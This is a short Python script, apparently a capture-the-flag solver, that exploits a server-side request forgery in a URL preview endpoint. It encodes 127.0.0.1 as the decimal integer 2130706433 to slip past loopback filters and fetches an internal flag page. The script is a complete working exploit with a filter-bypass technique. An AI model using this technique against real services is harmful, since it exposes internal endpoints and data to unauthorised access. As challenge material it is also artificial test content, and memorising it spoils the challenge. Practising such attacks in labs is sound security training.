#!/usr/bin/env python3
from __future__ import annotations

import os
import re
import urllib.parse
import urllib.request


def main() -> None:
    base_url = os.getenv('BASE_URL', 'http://127.0.0.1:8080').rstrip('/')
    service_port = int(os.getenv('SERVICE_PORT', '8080'))
    target = urllib.parse.quote(f'http://2130706433:{service_port}/internal/flag', safe='')
    body = urllib.request.urlopen(f'{base_url}/preview?url={target}').read().decode()
    match = re.search(r'flag\{[a-zA-Z0-9_\-]+\}', body)
    if not match:
        raise SystemExit('flag not found')
    print(match.group(0))


if __name__ == '__main__':
    main()
